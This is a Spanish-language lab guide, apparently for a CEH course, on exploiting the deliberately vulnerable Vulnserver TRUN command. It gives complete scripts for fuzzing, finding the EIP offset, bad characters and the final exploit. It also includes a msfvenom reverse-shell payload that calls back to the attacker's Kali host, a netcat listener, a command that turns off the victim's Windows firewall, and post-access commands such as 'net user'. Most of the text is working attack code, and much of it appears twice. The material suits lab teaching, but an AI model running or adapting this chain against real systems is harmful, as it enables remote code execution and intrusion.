> ⚠️ Immunity arranca con el proceso en PAUSED. Si no le das Play, nada conecta. Este fue uno de tus errores: verificar siempre el "Running" abajo a la derecha antes de cada script.

---

## PASO 1 — Verificar la conexión 🟢

En Kali:

```bash
nc -nv 192.168.190.132 9999
```

Escribe `HELP` y Enter (tiene que listar TRUN entre los comandos). Sal con **Ctrl+C**.

> 📹 "Confirmo que la máquina víctima está viva y que el puerto 9999 del servidor vulnerable está abierto."

---

## PASO 2 — Spiking (identificar el comando vulnerable) 🟢

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.** Es solo para mostrar en el video que STATS no tumba el servidor, como hace el manual. Si lo haces, primero asegúrate de que el servidor está en Running (🟢).
>
> Crea el archivo con:
>
> ```bash
> nano stats.spk
> ```
>
> Pega exactamente (dice STATS sin espacio):
>
> ```
> s_readline();
> s_string("STATS");
> s_string_variable("0");
> ```
>
> Guarda: **Ctrl+O → Enter → Ctrl+X**. Envíalo:
>
> ```bash
> generic_send_tcp 192.168.190.132 9999 stats.spk 0 0
> ```
>
> Immunity sigue en **Running** (STATS no es vulnerable) → eso es lo que querías mostrar. Detenlo con **Ctrl+C**.

Ahora el paso obligatorio. El servidor debe estar en **Running** (🟢). Crea el archivo:

```bash
nano trun.spk
```

Pega exactamente (⚠️ `"TRUN "` lleva un ESPACIO antes de la comilla de cierre):

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Envíalo:

```bash
generic_send_tcp 192.168.190.132 9999 trun.spk 0 0
```

**Qué esperar:** Immunity pasa a **Paused** (🔴) = TRUN es vulnerable a buffer overflow.

> ⚠️ A veces Spike termina con `Done.` y Immunity sigue en Running (no generó datos suficientes para tumbarlo). Es normal. Fuérzalo manualmente para demostrar la vulnerabilidad:
>
> ```bash
> python3 -c "import socket; s=socket.socket(); s.connect(('192.168.190.132', 9999)); s.send(b'TRUN /.:/' + b'A'*5000); s.close()"
> ```
>
> Si 5000 no lo tumba, prueba cambiando el número a 10000. Con que Immunity pase a **Paused** ya está demostrado.

> 📹 "Envío datos aleatorios al comando TRUN con Spike. Si el proceso pasa a Paused, TRUN es vulnerable a buffer overflow."

**Estado actual: 🔴 servidor en Paused (muerto).** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 3 — Fuzzing (tamaño del crash) 🟢 (después de 🔁 reiniciar)

Crea el archivo:

```bash
nano fuzz.py
```

Pega esto:

```python
import socket, time, sys
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
buffer = b"A" * 100
while True:
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(prefix + buffer)
        s.close()
        print("Fuzzing with %s bytes" % len(buffer))
        buffer += b"A" * 100
        time.sleep(1)
    except Exception:
        print("Crashed at %s bytes" % len(buffer))
        sys.exit(0)
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica que quedó bien:

```bash
cat fuzz.py
```

Ejecuta:

```bash
python3 fuzz.py
```

**Qué esperar:** los números de bytes suben (100, 200, 300...). Vigila **Immunity**, no solo la terminal: cuando cambie a **Paused** (🔴), el crash ya ocurrió. Anota en qué número iba la terminal y detén el fuzzer con **Ctrl+C**.

> ⚠️ Tu fuzzer llegó hasta 15000 sin darse cuenta del crash: el servidor ya estaba muerto y las conexiones fallaban en silencio. LA PRUEBA ESTÁ EN IMMUNITY: Paused = cayó. No es crítico saber el número exacto; el offset de este servidor es 2003 y con un patrón de 3000 es suficiente.

> 📹 "Envío cada vez más datos hasta que el servidor se cae, para saber de qué tamaño es el buffer."

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 4 — Offset (posición exacta del EIP) 🟢 (después de 🔁 reiniciar)

**1. Genera el patrón DIRECTO a un archivo** (nunca lo copies/peges a mano: son 3000 caracteres y el pegado se corta):

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 > patron.txt
```

**2. Crea el script que lo envía:**

```bash
nano pattern.py
```

Pega esto (la línea `open("patron.txt", "rb").read().strip()` lee el patrón del archivo — no hay nada que pegar a mano):

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
pattern = open("patron.txt", "rb").read().strip()
s = socket.socket()
s.connect((ip, port))
s.send(prefix + pattern)
s.close()
print("Patrón enviado:", len(pattern), "bytes")
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica con:

```bash
cat pattern.py
```

**3. Envíalo** (servidor en Running 🟢):

```bash
python3 pattern.py
```

Debe imprimir `Patrón enviado: 3000 bytes`. El servidor queda en **Paused** (🔴).

> ⚠️ Si escribes solo `pattern.py` sale "no se encontró la orden". Siempre `python3 pattern.py`.

**4. Lee el EIP — NO reinicies todavía.** En Immunity, panel de registros (arriba a la derecha), fila **EIP**: anota el valor. Debe ser 4 caracteres alfanuméricos (ej. `386F4337`).

- Si el EIP tiene caracteres raros (ej. `76F1000D` con números que no parecen letras del patrón) → ese crash NO es del patrón: el script no se ejecutó o estás viendo un crash viejo. Repite el paso completo con 🔁 reinicio incluido.
- Si sale `41414141` → se enviaron puras A's → revisa el `cat pattern.py`.

**5. Calcula el offset** (esto NO toca el servidor, se hace con el servidor pausado):

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

(cambia `386F4337` por TU EIP). Debe decir:

```
[*] Exact match at offset 2003
```

> 📹 "El servidor cayó y el EIP quedó con el valor del patrón; con ese valor calculo la posición exacta donde se sobrescribe el registro: offset 2003."

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 5 — Confirmar control del EIP (overwrite.py) 🟢 (después de 🔁 reiniciar)

Crea el archivo:

```bash
nano overwrite.py
```

Pega esto:

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
buffer = b"A" * 2003 + b"B" * 4
s = socket.socket()
s.connect((ip, port))
s.send(prefix + buffer)
s.close()
print("Payload enviado:", len(buffer), "bytes")
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica con `cat overwrite.py`. Ejecuta:

```bash
python3 overwrite.py
```

**Qué esperar:** Immunity pasa a **Paused** (🔴), EIP = **`42424242`** y mensaje "Access violation when executing \[42424242\]". Eso confirma que controlas el registro.

> ⚠️ Si "corre" sin crash y todo sigue en Running → el servidor estaba muerto del crash anterior. 🔁 Reinicia y repite. SIEMPRE reinicias ANTES de cada script, no después de leer el EIP.

> 📹 "Con 2003 letras A y 4 letras B, el EIP queda en 42424242. Confirmo que controlo el registro de instrucciones."

**Estado actual: 🔴 servidor en Paused.** Antes del siguiente paso → **🔁 regla del reinicio**.

---

## PASO 6 — Bad characters 🟢 (después de 🔁 reiniciar)

**1. Genera el bytearray con mona.** Con el servidor en **Running** (🟢), en la barra de comandos de Immunity (abajo):

```
!mona bytearray -b "\x00"
```

Esto crea `c:\mona\vulnserver\bytearray.bin` (todos los bytes de `\x01` a `\xff`, sin el `\x00`). Anota la carpeta que muestra el log.

**2. Crea el script en KALI** (⚠️ este script va en Kali, NO en la barra de comandos de Immunity — ya te pasó escribirlo ahí):

```bash
nano badchars.py
```

Pega esto (la línea `bytes(range(1, 256))` genera sola el array de `\x01` a `\xff`; no escribas la lista a mano):

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
offset = 2003
badchars = bytes(range(1, 256))
buffer = prefix + b"A" * offset + b"B" * 4 + badchars
s = socket.socket()
s.connect((ip, port))
s.send(buffer)
s.close()
print("Payload enviado:", len(buffer), "bytes")
```

Guarda: **Ctrl+O → Enter → Ctrl+X**. Verifica con `cat badchars.py`. Ejecuta:

```bash
python3 badchars.py
```

Debe imprimir `Payload enviado: 2262 bytes`. El servidor queda en **Paused** (🔴) con EIP `42424242`.

**3. Lee la dirección del ESP — NO reinicies todavía.** En el panel de registros (arriba a la derecha), fila **ESP**: anota el número tipo `0012F8B0`.

> ⚠️ ESE número es la dirección de memoria donde cayeron tus bytes y es lo que va en el `-a` del compare. NO uses el valor del EIP (`42424242`) — eso es contenido, no una dirección (ya te pasó). Y el ESP **cambia en cada crash**: lee siempre el valor ACTUAL de este crash, nunca uno viejo.

4. Compara con mona (se hace con el servidor pausado):

!mona compare -f c:\mona\vulnserver\bytearray.bin -a 0012F8B0

(cambia 0012F8B0 por TU ESP actual). Se abre una ventana de comparación. Así sabes si te salió bien o mal:

✅ SALIÓ BIEN — verás este mensaje exacto (o muy parecido):

Hooray, normal shellcode UNMODIFIED !!!

Significa: los 255 bytes llegaron a memoria intactos, sin corromper ninguno. Por lo tanto el único bad char es \x00 (el que ya excluiste al generar el bytearray). No hay nada más que anotar: en el Paso 8 usarás -b "\x00" solamente.


📹 Si salió BIEN, di esto: "Comparo lo que llegó a memoria con lo que envié. Mona dice 'unmodified': los bytes llegaron intactos, así que el único carácter que corrompe el servidor es el byte nulo \x00. Ese será el único bad char que excluiré de mi shellcode."

❌ SALIÓ MAL (hay bad chars adicionales) — verás líneas como estas:

Possibly bad chars:
BadChars: 00 01 2e
Corruption after 2 bytes

Significa: esos bytes de la lista NO llegaron iguales a memoria — el servidor los corrompió. Cada byte de esa lista es un bad char adicional: anótalos. Tus bad chars totales = \x00 + los de la lista. En el Paso 8 los pones TODOS en el -b (ejemplo: lista 00 01 → -b "\x00\x01").

📹 Si salió MAL, di esto: "Mona detectó que el servidor corrompe estos bytes: 00, 01... Los anoto como bad characters y los excluiré del shellcode para que no rompan mi exploit."

⚠️ IMPORTANTE: "salió mal" no significa que hiciste el paso mal — los bad chars son una propiedad del servidor vulnerable, no un error tuyo. El paso está bien hecho en ambos casos; lo que cambia es la LISTA de bad chars que te llevas al Paso 8. (En una misma máquina puede salir distinto entre corridas: una vez marcó 00 01 y otra salió unmodified — siempre manda lo que diga TU compare de HOY.)

⚠️ El orden importa: el compare se ejecuta DESPUÉS de que badchars.py tumbe el servidor. Si lo corres antes del crash, compara contra cualquier cosa.

Estado actual: 🔴 servidor en Paused. Antes del siguiente paso → 🔁 regla del reinicio.

---

## PASO 7 — JMP ESP en essfunc.dll 🟢 (después de 🔁 reiniciar)

**1. Lista los módulos.** Con el servidor en **Running** (🟢), en Immunity:

```
!mona modules
```

Se abre una tabla con columnas: `Base | Size | Rebase | SafeSEH | ASLR | CFG | NXCompat | OS Dll | Version | Modulename & Path`.

**Cómo leerla:** ve a la fila que termina en `essfunc.dll` y mira las 5 columnas del medio. Debes ver:

- **Rebase:** False ✔
- **SafeSEH:** False ✔
- **ASLR:** False ✔
- **CFG:** False ✔
- **NXCompat:** False ✔ (esta columna ES el "DEP")

False = protección desactivada = la DLL es explotable. Si alguna dijera True, habría que buscar otro módulo.

> 📹 "essfunc.dll aparece sin ASLR, sin DEP (NXCompat), sin SafeSEH ni CFG: no tiene protecciones, así que puedo usarla para saltar a mi shellcode."

**2. Busca la instrucción JMP ESP** (en la barra de Immunity; escribe los caracteres exactos: barra invertida `\`, luego `xff`, luego `\xe4`, todo entre comillas dobles rectas y sin espacios):

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

Debe decir `Found a total of 9 pointers` y listar direcciones. Anota la **primera** (en tu máquina fue **`625011af`**).

> ⚠️ Si dice `Found a total of 0 pointers` → **vulnserver no estaba corriendo/atachado**. Verifica que vulnserver esté abierto como admin y atachado en Immunity (File → Attach), y repite el comando.

> ⚠️ Usa SIEMPRE la dirección que te imprima TU mona find, no la de otra guía. La dirección se escribe al revés en el exploit (little-endian): `625011af` → `\xaf\x11\x50\x62`. Si te saliera otra (ej. `760011af`) → `\xaf\x11\x00\x76`.

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.** El manual muestra cómo verificar que `ffe4` es el código de JMP ESP:
>
> ```bash
> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
> ```
>
> Escribe `JMP ESP` y Enter → sale `ffe4`. Sal con `exit`.

> 📹 "Busco un módulo sin protecciones y una instrucción JMP ESP para saltar a mi shellcode cuando sobrescriba el EIP."

**Estado actual: servidor en Running (🟢) — este paso no tumba nada.** Igual, antes del Paso 10 se cierra Immunity, así que el estado aquí no es crítico.

---

## PASO 8 — Shellcode (en Kali; LHOST es la IP de KALI)

⚠️ **LHOST es SIEMPRE la IP de Kali (`192.168.190.129`), nunca la de la víctima.**

⚠️ Los bad chars de `-b` son los que te marcó TU compare en el Paso 6 (en tu máquina: `\x00\x01`):

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.190.129 LPORT=4444 EXITFUNC=thread -f python -a x86 -b "\x00\x01"
```

**Qué esperar (todo esto es NORMAL, no son errores):**

- `No platform was selected, choosing Msf::Module::Platform::Windows` → aviso informativo.
- `shikata_ga_nai succeeded with size 351` → msfvenom codificó el payload para evitar los bad chars.
- Las líneas `buf =  b""` y `buf += b"\xda\xcb..."` → **eso es tu shellcode** en formato Python. Va al exploit.py del Paso 9.

> 📹 "Genero el shellcode de reverse shell apuntando a mi Kali en el puerto 4444, excluyendo los bad characters que detecté."

---

## PASO 9 — Exploit final (exploit.py) 🟢

**1. Crea el archivo:**

```bash
nano exploit.py
```

**2. Pega esta PLANTILLA completa:**

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
overflow = b"A" * 2003
retn = b"\xaf\x11\x50\x62"   # 625011af little-endian
padding = b"\x90" * 16
buf = b""
buf += b"PEGA_EL_BUF_DE_MSFVENOM"
buffer = prefix + overflow + retn + padding + buf
s = socket.socket()
s.connect((ip, port))
s.send(buffer)
s.close()
print("Exploit enviado.")
```

Guarda por ahora: **Ctrl+O → Enter** (no cierres nano todavía).

**3. Ahora inserta TU shellcode — hazlo EXACTO así, que aquí ya te rompió dos veces:**

- En la terminal de Kali (donde corriste msfvenom), selecciona y copia TODAS las líneas `buf += b"..."` de tu msfvenom — **desde la PRIMERA línea `buf +=` hasta la ÚLTIMA línea `buf +=`**.
- ⚠️ **NO copies la primera línea `buf =  b""` de msfvenom** — la plantilla ya tiene su propio `buf = b""`. Si la pegas también, se crea una línea rota tipo `buf += buf =  b""` que da SyntaxError (te pasó).
- En nano, ponte sobre la línea `buf += b"PEGA_EL_BUF_DE_MSFVENOM"` y **bórrala** (Ctrl+K).
- En su lugar pega las líneas copiadas.
- ⚠️ Si estás reemplazando un shellcode VIEJO por uno nuevo: borra TODAS las líneas buf viejas primero (de `buf = b""` hasta la última `buf +=`) y pega limpio. Nunca mezcles dos shellcodes — te quedó pegada una línea del shellcode anterior (`\xad\x2e\xa1`) al final del nuevo.

**4. Verifica con `cat exploit.py`.** Esta es tu checklist de verificación (todo debe cumplirse):\*\*

- `buf = b""` aparece **EXACTAMENTE una vez**.
- NO existe ninguna línea `buf += buf` (pegado doble).
- La PRIMERA línea del shellcode es la primera `buf += b"..."` de TU msfvenom reciente.
- La ÚLTIMA línea del buf es la última línea de TU msfvenom reciente — no una línea de un shellcode viejo.
- `retn = b"\xaf\x11\x50\x62"` con TU dirección de mona find al revés.
- El `LHOST` del shellcode ya quedó adentro (no se toca aquí, msfvenom ya lo puso).

Guarda: **Ctrl+O → Enter → Ctrl+X**.

**NO ejecutes todavía.** Primero el Paso 10, que tiene un orden estricto.

---

## PASO 10 — EL GOLPE FINAL (orden estricto, aquí se cambia la regla)

> ⚠️ **Este es el ÚNICO momento de toda la práctica donde vulnserver corre SIN Immunity.** La shell no sale si Immunity está abierto con el proceso pausado o atachado.

**1. Limpia el puerto 4444** (por si quedó el handler de Armitage de la otra práctica ocupándolo):

```bash
sudo pkill -f msfrpcd
```

(y cierra Armitage si lo tienes abierto).

**2. En Victima 2 — cierra Immunity Debugger** (la X). Luego **verifica que la ventana negra de vulnserver SIGA viva** (debe verse "Waiting for client connections"). Si al cerrar Immunity se cerró también vulnserver:

- Abre `C:\vulnserver\vulnserver.exe` → clic derecho → **Ejecutar como administrador** → Firewall → Permitir acceso. Déjalo corriendo SOLO, sin Immunity.

**3. En Kali — Terminal 1: el listener PRIMERO:**

```bash
nc -nvlp 4444
```

Se queda esperando ("listening on \[any\] 4444..."). **NO cierres ni toques esa terminal.** Ahí va a aparecer la shell.

**4. En Kali — Terminal 2 (Ctrl+Shift+T, sin cerrar la Terminal 1):**

```bash
python3 exploit.py
```

**5. LA SHELL APARECE EN LA TERMINAL 1** — la que tiene `nc -nvlp 4444`. VUELVE a esa terminal: debe haber aparecido el prompt de Windows (algo como `C:\Users\...>`). Ahí escribes los comandos.

> ⚠️ Esto es clave: los comandos de la shell NO se escriben en la Terminal 2 (la del exploit) ni en ninguna otra. Se escriben en la **Terminal 1, la del netcat**. Si escribes `whoami` y no responde, mira si estás en la terminal correcta.

> ⚠️ Si la Terminal 1 se queda muda tras el exploit: ¿mataste el handler de Armitage (paso 1)? ¿vulnserver está corriendo solo? ¿ejecutaste el `nc` ANTES del exploit? Revisa las tres en ese orden.

> 📹 "Ejecuto el exploit completo: relleno el buffer, sobrescribo el EIP con la dirección del JMP ESP y el shellcode me devuelve una shell inversa en mi Kali."

---

## PASO 11 — Demostración de acceso (en la Terminal 1, la del netcat)

Con la shell abierta en la Terminal 1, escribe:

```
whoami
```

Debe responder con el usuario de la víctima (ej. `victima2\luis mendez`). Luego:

```
ipconfig
```

Debe mostrar la `192.168.190.132` de la víctima — prueba total de que estás DENTRO de la máquina remota.

> 🟡 **PASO OPCIONAL — puedes saltarlo sin problema. Esto NO es necesario para que la práctica funcione.** Comandos extra si quieres lucir el acceso en el video (siempre en la Terminal 1):
>
> ```
> systeminfo
> dir
> net user
> ```

> 📹 "Con whoami e ipconfig confirmo que tengo acceso total a la máquina víctima desde mi Kali."

**Sobre el PDF del manual:** ahí aparece "whoami, getuid, getsystem", pero `getuid` y `getsystem` son comandos de **Meterpreter** y NO existen en esta shell de netcat. Si el profesor pregunta: "getuid y getsystem corresponden a una sesión Meterpreter, que es la práctica de Armitage; en una reverse shell cruda el comando equivalente es whoami".

---

## 🔁 ¿Vas a repetir el exploit (re-grabar)?

Después de una shell exitosa el servidor queda congelado. Para repetir todo el golpe final:

1. En la Terminal 1 cierra la shell: **Ctrl+C** (se cierra el netcat).
2. En Victima 2: cierra vulnserver congelado y **ábrelo de nuevo como administrador** (sin Immunity).
3. Terminal 1: `nc -nvlp 4444`
4. Terminal 2: `python3 exploit.py`
5. Vuelve a la Terminal 1 → `whoami`.

---
                        
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>

# 📋 Práctica 2: Buffer Overflow (Vulnserver, CEH 1.7) – 5 puntos

## Descargas (en este orden, en Victima 2)

| Para qué | Enlace | Qué bajar |
|---|---|---|
| Servidor vulnerable (enlace del profesor) | https://github.com/stephenbradshaw/vulnserver | `vulnserver.exe` y `essfunc.dll` |
| Immunity Debugger | https://github.com/kbandla/ImmunityDebugger/releases | `ImmunityDebugger_1.85_setup.exe` |
| Python 2.7 de 32 bits (si el setup no lo instala solo) | https://www.python.org/downloads/release/python-2718/ | **Windows x86 MSI installer** (¡NO el de 64 bits!) |
| mona.py | https://github.com/corelan/mona/blob/master/mona.py | Botón **Raw** → Guardar como |
| Referencia del orden del lab | https://github.com/Indrajith-S/CEH-Lab-Notes/blob/master/5.%20System%20Hacking/Perform%20Buffer%20Overflow%20Attack%20to%20Gain%20Access%20to%20a%20Remote%20System.md | Guía (no se instala) |

**Explicación:** "El enlace del profesor es el programa vulnerable: de ahí salen vulnserver.exe y essfunc.dll. No es una página de soluciones."

### Instalación

1. **Immunity:** clic derecho → Ejecutar como administrador. Al terminar el setup y darle Aceptar, se abre solo el instalador de **Python 2.7.1**: `Install for all users`, ruta `C:\Python27\`, Finish. Si esa ventana no sale, instala el MSI de 32 bits del enlace de arriba.
2. **mona.py:** en la página del archivo, **Raw → Guardar como**. Destino: `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\`. En **Tipo** elige **Todos los archivos**; si lo dejas en "Documento de texto" queda como `mona.py.txt` y `!mona` no responde. Windows puede pedir permiso de administrador para pegar en Program Files: acepta.
   - Si ya te pasó: renombra el archivo a `mona.py` (Windows avisa que puede quedar inutilizable → Sí).
   - Verificación: abre Immunity como admin y escribe `!mona` abajo. Si sale la ayuda, está bien.
3. **Carpeta del servidor:** copia `vulnserver.exe` y `essfunc.dll` **juntos** en `C:\vulnserver\`.

## Preparación de Victima 2

CMD **como administrador**:

```cmd
netsh advfirewall set allprofiles state off
```

1. Clic derecho en `C:\vulnserver\vulnserver.exe` → **Ejecutar como administrador**. Si sale el aviso del Firewall → **Permitir acceso**. **No cierres esa ventana negra** (minimízala).
2. Abre **Immunity Debugger como administrador**. Abajo en la barra de comandos:

```
!mona
!mona config -set workingfolder c:\mona\%p
```

3. **File → Attach → vulnserver → Attach** y pulsa el **Play** (Run program). Abajo a la derecha tiene que decir **Running**. *(Immunity arranca pausado: si no le das Play, nada conecta.)*

## En Kali: verificar conexión

```bash
nc -nv 192.168.190.132 9999
```

Escribe `HELP` (tiene que listar TRUN). Sal con Ctrl+C.

## Spiking (identificar el comando vulnerable)

**Opcional (como el manual): STATS primero, para mostrar que NO se cae.** Crea `stats.spk`:
## Opcional:
```bash
nano stats.spk
```

Pega (nota: dice STATS, sin espacio):

```
s_readline();
s_string("STATS");
s_string_variable("0");
```

Guarda con Ctrl+O, Enter, y sal con Ctrl+X. Envíalo con `generic_send_tcp 192.168.190.132 9999 stats.spk 0 0` → el proceso **sigue en Running** (STATS no es vulnerable). Detenlo con Ctrl+C.
## Esto si va:
**Ahora el que sí importa: TRUN.** Crea `trun.spk`:

```bash
nano trun.spk
```

Pega exactamente (nota: `"TRUN "` lleva un espacio antes de la comilla de cierre):

```
s_readline();
s_string("TRUN ");
s_string_variable("0");
```

Guarda con Ctrl+O, Enter, y sal con Ctrl+X. Envíalo:

```bash
generic_send_tcp 192.168.190.132 9999 trun.spk 0 0
```

**Explicación:** "Envío datos aleatorios al comando TRUN con Spike. Si el proceso pasa a Paused, TRUN es vulnerable a buffer overflow."

⚠️ **Errores que ya te salieron aquí:**
- `generic_send_tcp` no existe → `sudo apt install spike`.
- El spike termina con `Done.` pero Immunity sigue en **Running** → a veces no genera el patrón que tumba el servidor. **Es normal.** Fórzalo manualmente:

```bash
python3 -c "import socket; s=socket.socket(); s.connect(('192.168.190.132', 9999)); s.send(b'TRUN /.:/' + b'A'*5000); s.close()"
```

Si 5000 no lo tumba, prueba 10000. Con que pase a **Paused** ya está demostrado (el fuzzing de abajo prueba lo mismo).

## 🔄 Regla del reinicio (aplica DESPUÉS de cada crash)

1. Cierra **Immunity** primero (Debug → Close, o la X).
2. Cierra vulnserver (ahora sí obedece; mientras está atachado a Immunity la ventana queda congelada y `taskkill /F /IM vulnserver.exe` no funciona).
3. Abre vulnserver.exe como admin → Immunity como admin → File → Attach → vulnserver → Attach → **Play** → verificar **Running**.

## Fuzzing (tamaño del crash)

Crea `fuzz.py` con `nano fuzz.py` (⚠️ te pasó que quedó vacío y al ejecutarlo no salía nada: verifica con `cat fuzz.py` antes de correrlo):

```python
import socket, time, sys
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
buffer = b"A" * 100
while True:
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(prefix + buffer)
        s.close()
        print("Fuzzing with %s bytes" % len(buffer))
        buffer += b"A" * 100
        time.sleep(1)
    except Exception:
        print("Crashed at %s bytes" % len(buffer))
        sys.exit(0)
```

```bash
chmod +x fuzz.py
python3 fuzz.py
```

**Explicación:** "Envío cada vez más datos hasta que el servidor se cae, para saber de qué tamaño es el buffer."

⚠️ **Errores que ya te salieron aquí:**
- El fuzzer siguió hasta 15000 bytes sin detectar el crash. **Mira Immunity, no solo la terminal:** cuando cambie a **Paused**, el crash ya ocurrió; anota los bytes que iba enviando y dale **Ctrl+C** al fuzzer.
- No viste en cuántos bytes cayó → no es crítico: el offset de este vulnserver es 2003 y con un patrón de 3000 es suficiente.

Después del crash → **aplica la regla del reinicio**.

## Offset (posición exacta del EIP)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 > patron.txt
```

⚠️ **Guarda el patrón en un archivo (patron.txt), NO lo copies/pegues a mano en nano:** son 3000 caracteres y el pegado se corta (te pasó: el patrón quedó en ~1300 y salió un EIP raro). Ahora crea el script que envía el patrón:

```bash
nano pattern.py
```

Pega esto (la línea `open("patron.txt", "rb").read().strip()` lee el patrón del archivo — no hay nada que pegar a mano). Guarda con Ctrl+O, Enter, Ctrl+X:

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
pattern = open("patron.txt", "rb").read().strip()
s = socket.socket()
s.connect((ip, port))
s.send(prefix + pattern)
s.close()
print("Patrón enviado:", len(pattern), "bytes")
```

Verifica que quedó bien con `cat pattern.py`, asegúrate de que la víctima esté reiniciada y en **Running**, y ejecútalo **siempre con `python3` delante** (si escribes solo `pattern.py` sale "no se encontró la orden"):

```bash
python3 pattern.py
```

Debe imprimir `Patrón enviado: 3000 bytes` y tumbar el servidor.

En Immunity, anota el valor del **EIP** (arriba a la derecha, ej. `386F4337`). En Kali:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
```

Tiene que decir **2003**. → Reinicia (regla del reinicio).

## Confirmar control del EIP (overwrite.py)

Reinicia primero (regla del reinicio). Luego crea el script:

```bash
nano overwrite.py
```

Pega esto, guarda con Ctrl+O, Enter, Ctrl+X, y verifica con `cat overwrite.py`:

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
buffer = b"A" * 2003 + b"B" * 4
s = socket.socket()
s.connect((ip, port))
s.send(prefix + buffer)
s.close()
```

Ejecútalo:

```bash
python3 overwrite.py
```

Immunity debe mostrar `Access violation when executing [42424242]` y EIP = `42424242`.

**Explicación:** "Con 2003 letras A y 4 B, el EIP queda en 42424242. Confirmo que controlo el registro."

⚠️ Te pasó que salió "exit code 0" y todo en Running: era el servidor ya muerto del crash anterior. Reinicia antes de cada script.

## Bad characters

1. Con el proceso en **Running** (recién reiniciado), en Immunity:

```
!mona bytearray -b "\x00"
```

2. Crea el script con:

```bash
nano badchars.py
```

Pega esto, guarda con Ctrl+O, Enter, Ctrl+X, y verifica con `cat badchars.py`. ⚠️ Este script se ejecuta **en Kali**, NO en la barra de comandos de Immunity (te pasó escribiéndolo ahí). La línea `bytes(range(1, 256))` genera sola el array de `\x01` a `\xff` (no escribas la lista de bytes a mano):

```python
import socket
ip = "192.168.190.132"
port = 9999
prefix = b"TRUN /.:/"
offset = 2003
badchars = bytes(range(1, 256))
buffer = prefix + b"A" * offset + b"B" * 4 + badchars
s = socket.socket()
s.connect((ip, port))
s.send(buffer)
s.close()
print("Payload enviado:", len(buffer), "bytes")
```

Debe imprimir `Payload enviado: 2262 bytes` (prefijo 9 + 2003 A + 4 B + 255 bytes del array). Ejecútalo con:

```bash
python3 badchars.py
```

3. **Después** del crash (Paused, EIP 42424242), lee la dirección del **ESP**: en el panel de registros de arriba a la derecha (EAX, ECX, ... **ESP**, EIP), la fila **ESP** muestra un número tipo `0012F8B0`. Ese número es **la dirección de memoria donde cayeron tus bytes** y es lo que va en el `-a`. ⚠️ El ESP **cambia en cada crash/reinicio**: lee siempre el valor actual, nunca reutilices uno viejo. NO uses el valor del EIP (42424242): eso es contenido, no una dirección. Con esa dirección:

```
!mona compare -f C:\mona\vulnserver\bytearray.bin -a 0012F8B0
```

⚠️ **El orden importa (te falló por esto):** `!mona compare` se ejecuta **después** de que badchars.py tumbe el servidor y el ESP apunte al array. Si lo corres antes del crash, compara contra cualquier cosa y falla. En este vulnserver normalmente solo `\x00` es bad char.

## JMP ESP en essfunc.dll

Con el proceso **Running**, en Immunity:

```
!mona modules
```

Se abre una ventana con una **tabla**. Las columnas, en orden, son:

`Base | Size | Rebase | SafeSEH | ASLR | CFG | NXCompat | OS Dll | Version | Modulename & Path`

**Cómo leerla:** busca la fila cuyo final dice `essfunc.dll` y mira las columnas de protecciones de esa fila. Tienes que ver la palabra **`False`** en:

- **Rebase** → la DLL no reubica su dirección base
- **SafeSEH** → sin protección de SEH
- **ASLR** → sin aleatorización de direcciones
- **CFG** → sin Control Flow Guard
- **NXCompat** → sin DEP (esta columna **es** el "DEP")

`False` = la protección está **desactivada** → la DLL es explotable. Si alguna dijera `True`, ese módulo estaría protegido y habría que buscar otro. (Si essfunc.dll no aparece en la tabla, la DLL no está junto al exe y el proceso no la cargó.)

```
!mona find -s "\xff\xe4" -m essfunc.dll
```

⚠️ En el vulnserver clásico la dirección es **625011af** y en el exploit va al revés (little-endian): `\xaf\x11\x50\x62`. **PERO usa siempre la que te imprima a ti `!mona find`**: si en `!mona modules` la columna Base de essfunc.dll no es `62500000` (en tu máquina salió `76000000`), la dirección será otra (ej. si sale `760011af`, en el exploit es `\xaf\x11\x00\x76`). No copies la dirección de memoria ni de otro guía: la de TU captura.

**Explicación:** "Busco un módulo sin protecciones y una instrucción JMP ESP para saltar a mi shellcode cuando sobrescriba el EIP."

*(Opcional, como el manual: `nasm_shell.rb` → escribe `JMP ESP` → sale `ffe4`.)*

## Shellcode (en Kali — LHOST es KALI)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.190.129 LPORT=4444 EXITFUNC=thread -f python -a x86 -b "\x00"
```

